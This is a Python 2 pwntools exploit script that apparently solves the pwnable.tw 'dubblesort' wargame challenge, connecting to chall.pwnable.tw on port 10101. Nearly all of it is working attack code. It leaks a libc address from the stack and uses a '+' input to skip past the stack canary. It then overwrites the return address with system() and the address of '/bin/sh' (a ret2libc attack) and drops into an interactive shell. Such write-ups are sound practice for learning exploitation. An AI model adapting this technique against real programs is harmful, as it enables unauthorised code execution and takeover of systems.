#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('dubblesort')

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10101)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x56555a18
break *0x56555af9
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ["gnome-terminal", "-e"]
io = start()
io.sendafter(':', "A"*28)
io.recvuntil("A"*28)
#io.sendafter(':', "A"*12)
#io.recvuntil("A"*12)

addr = u32(io.recv(4)) - 0x1ae244
#addr = u32(io.recv(4)) - 0x31939
log.success("libc base: {}".format(hex(addr)))
io.recvuntil(':')

libc = ELF('libc_32.so.6')
#libc = ELF('/lib/libc.so.6')
libc.address = addr

binsh = next(libc.search('/bin/sh\x00'))
system = libc.symbols['system']
rbp = libc.symbols['system'] + 10
log.info("system: {} rbp: {} binsh: {}".format(hex(system), hex(rbp), hex(binsh)))

io.sendline('35')
for i in range(24):
    io.sendlineafter(':', '0')

io.sendlineafter(':', '+')
for i in range(8):
    io.sendlineafter(':', '{}'.format(system))
io.sendlineafter(':', '{}'.format(rbp))
io.sendlineafter(':', '{}'.format(binsh))

io.interactive()

